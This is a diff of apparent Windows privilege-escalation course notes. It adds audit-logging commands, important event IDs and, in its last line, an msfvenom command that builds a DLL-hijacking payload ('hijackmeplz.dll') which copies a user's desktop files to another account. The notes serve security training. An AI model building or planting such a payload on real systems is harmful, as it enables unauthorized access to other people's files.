@@ -790,11 +790,24 @@ https://sec.cybbh.io/-/public/-/jobs/870086/artifacts/slides/09-windows-priv-per
 
     wmic service list full
     sc query        
+## Other Vulnerabilities
+    unpatched kernel vulnerabilities
+    unpatched systems
+    unpatched applications
+##    DEMO: Audit Logging
+    Show all audit category settings
+        auditpol /get /category:*
+        auditpol /get /category:* | findstr /i "success failure" (for what is being audited)
+## Important Microsoft Event IDs
+    4624/4625 - successful/ failed login
+    4720 - account created
+    4672 - administrative user logged on
+    7045 - service created
 
 ## get sys internals tools
     net use z: "\\http://live.sysinternals.com" /persistent:yes 
     
-    
+    msfvenom to copy contents of desktop -> msfvenom -p windows/exec CMD='cmd.exe /C "xcopy C:\Users\Admin\Desktop C:\Users\comrade.WIN2-INTERNAL-D\Desktop\ /s"' -f dll > hijackmeplz.dll
     
     
     
